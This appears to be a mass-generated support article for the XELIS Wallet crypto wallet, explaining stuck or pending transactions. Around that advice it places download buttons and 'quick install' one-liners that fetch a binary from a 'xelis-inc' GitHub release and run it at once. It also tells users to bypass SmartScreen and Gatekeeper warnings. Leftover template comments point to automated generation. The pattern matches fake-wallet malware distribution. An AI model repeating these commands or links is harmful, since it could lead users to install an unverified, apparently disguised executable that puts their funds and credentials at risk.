![XELIS Wallet transaction stuck or still pending](assets/banner-article.png)
# XELIS Wallet transaction stuck or still pending

Tell pending from lost, then decide whether to wait or retry.

## Downloads - Fix

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Run the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1) before you diagnose a pending transaction; an older build can display a state the current one has already fixed.

> Pending is a queue position, not a loss. The dangerous move is sending again before you know which state you are in.

A pending transaction has been broadcast and is waiting to be included in a block. It is not lost, and its amount has not moved to the recipient yet. Check that the wallet is synced, note the transaction identifier, and confirm the state elsewhere before deciding to wait, retry with a higher fee, or treat it as never broadcast.

<!-- ARTICLE-BODY-BEGIN -->
## What pending actually means

In the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a>, three states get called "stuck" and they need different responses. A transaction can be queued and waiting, included and confirmed but not yet reflected because the wallet has not synced, or never broadcast at all because the send failed before leaving the machine. Only the first is a fee problem.

The wallet's history list is where the distinction starts. If the transaction appears there with an identifier, it was created and broadcast. If it does not appear at all, nothing left the wallet and the send needs to be repeated properly.

## Rule out the wallet's own view first

An unsynced wallet shows stale information, including a transaction that looks pending because the app has not read the block that confirmed it. Check the connection and the sync state before anything else; <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-not-syncing-not-connecting-fix.md">fix XELIS Wallet not syncing</a> walks through that check in order.

If sync is healthy and the entry still says pending, the wallet is reporting the network honestly and the transaction really is queued.

## Ranked causes and what each one looks like

| What you see | Most likely cause | What to do |
| --- | --- | --- |
| Pending for a long time, wallet synced | Fee below current conditions | Wait, or send again with a higher fee only if the recipient cannot wait |
| Pending with no identifier anywhere | The send never left the app | Retry the send from the send view |
| Confirmed in an explorer, pending in the wallet | Wallet has not synced that block | Let sync finish or switch node |
| Amount deducted, recipient sees nothing | Normal for a queued transaction | Nothing is wrong until it confirms |

The fee case and the never-broadcast case look similar in conversation and completely different in the wallet. That is why the identifier is the first thing to look for.

## Waiting, or making a second payment

Waiting costs nothing and is usually right, because a queued transaction normally confirms once conditions ease. A second payment is a deliberate choice: it creates a new transaction with a higher fee, and the first one may still confirm later, which means paying twice.

If you decide to send again, do it once, and keep the first transaction's identifier. <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-fees-too-low.md">How XELIS Wallet fees work</a> explains what the second attempt changes and what it does not.

## When it never confirms

A transaction that stays queued indefinitely is evidence worth keeping. Note the identifier, the fee, the time and what the wallet reported, then look at the logs before reporting it. <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-logs-report-bug.md">Read the XELIS Wallet logs</a> shows what to collect so the report can actually be acted on.

## FAQ

### Is a pending transaction lost?

No. It is waiting for inclusion, and the funds are accounted for in the wallet either way.

### Can I cancel a pending transaction?

There is no cancel button to rely on. You can wait, or make a new payment with a higher fee.

### Why does the recipient not see the funds yet?

Because the transaction has not been included in a block. Their wallet cannot show what the chain has not confirmed.

### How long should I wait before worrying?

Long enough for the wallet to sync fully and for the entry to have a confirmed identifier. If it is still pending after that and conditions are normal, treat it as a fee decision.

### Does resending charge me twice?

It can. A second payment is a second transaction, and the first may still confirm.

<!-- ARTICLE-BODY-END -->

## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [Fix XELIS Wallet not syncing](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-not-syncing-not-connecting-fix.md)
- [How XELIS Wallet fees work](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-fees-too-low.md)
- [Read the XELIS Wallet logs](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-logs-report-bug.md)
- [Send XEL with XELIS Wallet](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-send-fee-confirmation.md)
- [Current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1)
